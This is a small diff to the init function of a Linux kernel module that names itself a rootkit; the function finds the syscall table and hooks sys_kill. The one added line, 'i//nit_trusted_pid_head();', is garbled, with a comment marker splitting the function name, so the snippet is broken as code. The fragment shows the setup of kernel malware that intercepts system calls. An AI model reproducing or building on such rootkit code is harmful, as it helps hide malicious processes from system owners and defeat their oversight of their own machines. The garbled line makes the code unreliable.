@@ -24,6 +24,7 @@ static void __exit ModuleExit(void);
 static int __init ModuleInit(void) {
 	printk("[rootkit][core.c::ModuleInit] DEBUG    rootkit initiated\n");  //DEBUG
 	init_logging();
+	i//nit_trusted_pid_head();
 	log_msg("[core.c::ModuleInit] logging initiated\n");
 	get_syscall_table();
 	install_hook(&sys_kill);
